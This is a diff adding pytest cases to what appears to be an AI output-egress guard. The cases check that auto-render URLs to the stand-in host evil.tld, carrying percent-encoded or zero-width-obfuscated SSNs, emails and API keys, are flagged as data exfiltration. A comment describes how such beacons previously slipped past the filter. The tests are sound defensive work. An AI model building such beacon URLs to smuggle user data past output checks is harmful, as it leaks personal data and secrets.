@@ -483,6 +483,41 @@ def test_g88_benign_encoded_output_preserved(label, payload):
     assert egress == payload and action == "allow", f"{label}: benign encoded output altered (false positive)"
 
 
+# G89 — percent-encoded PII/secret in an auto-render EXFIL URL (CONFIRMED LEAK, fixed 2026-07-03).
+# `_url_smuggles_data`'s sensitive_payload signal ran detect_* on the URL tail but did NOT percent-decode
+# it — yet URLs NATIVELY percent-encode data and the receiving server transparently decodes
+# `?d=%31%32%33-...` back to the raw PII. So a percent-encoded PII/secret auto-render beacon egressed raw
+# (verdict allow). FIXED: percent-decode the tail (+ Cf-stripped view) into the probe. FROZEN via
+# _url_smuggles_data. (The base64/hex encoded_payload path was G86; this is the plaintext-percent
+# sensitive_payload sibling — the standard URL data encoding.)
+def _pctd(s: str) -> str:
+    return "".join("%%%02X" % b for b in s.encode())
+
+
+@pytest.mark.parametrize("label,url", [
+    ("g89_pct_ssn_query",   "https://evil.tld/log?d=" + _pctd(SSN)),
+    ("g89_pct_email_query", "https://evil.tld/log?d=" + _pctd(EMAIL)),
+    ("g89_pct_key_query",   "https://evil.tld/log?d=" + _pctd(OAI_KEY)),
+    ("g89_pct_ssn_path",    "https://evil.tld/" + _pctd(SSN) + "/pixel.png"),
+    ("g89_pct_cf_ssn",      "https://evil.tld/log?d=" + zero_width(_pctd(SSN))),
+])
+def test_g89_percent_encoded_pii_exfil_url_flagged(label, url):
+    assert _og._url_smuggles_data(url), (
+        f"{label}: percent-encoded PII/secret exfil payload not detected (beacon would egress raw)"
+    )
+
+
+# FP guard: benign percent-encoding (path escapes `%2F`, encoded spaces `%20`, presigned signatures that
+# decode to non-PII) must NOT be flagged as exfil.
+@pytest.mark.parametrize("label,url", [
+    ("g89_fp_pathesc",   "https://cdn.acme.com/a%2Fb%2Fc/img.png"),
+    ("g89_fp_space",     "https://x.com/my%20file%20name.png"),
+    ("g89_fp_presigned", "https://s3.amazonaws.com/b/k.png?X-Amz-Signature=deadbeef01&X-Amz-Expires=3600"),
+])
+def test_g89_benign_percent_url_not_flagged(label, url):
+    assert not _og._url_smuggles_data(url), f"{label}: benign percent URL wrongly flagged as data-exfil (false positive)"
+
+
 # G77 — truncation-boundary defense (verified defended, FROZEN against config drift). Obfuscated
 # PII/secret placed PAST patterns._CANON_MAX_LEN escapes the canonical pass (a fullwidth SSN at
 # offset 21k -> detect_pii False, since canonicalize_for_detection only folds text[:_CANON_MAX_LEN];
